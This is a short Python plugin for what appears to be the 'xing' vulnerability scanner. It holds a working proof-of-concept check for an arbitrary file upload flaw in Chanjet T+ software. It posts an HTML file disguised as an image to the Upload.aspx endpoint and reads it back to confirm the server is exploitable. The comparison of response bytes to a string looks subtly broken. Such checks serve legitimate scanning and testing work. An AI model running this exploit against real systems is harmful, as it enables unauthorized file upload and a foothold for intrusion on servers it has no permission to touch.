import requests

from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "用友畅捷通任意文件上传漏洞"
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]
        self.app_name = "Chanjet"

    def verify(self, target):
        url = target + "/tplus/SM/SetupAccount/Upload.aspx?preload=1"
        test_url = target + "/tplus/SM/SetupAccount/images/test.html"
        file = [("File1", ("test.html", "test", "image/jpeg"))]
        resp = ""
        try:
            requests.post(url, files=file, verify=False)
            resp = requests.get(test_url, verify=False).content
        except Exception:
            pass
        if resp == "test":
            self.logger.success("用友畅捷通任意文件上传漏洞 {}".format(test_url))
            return test_url
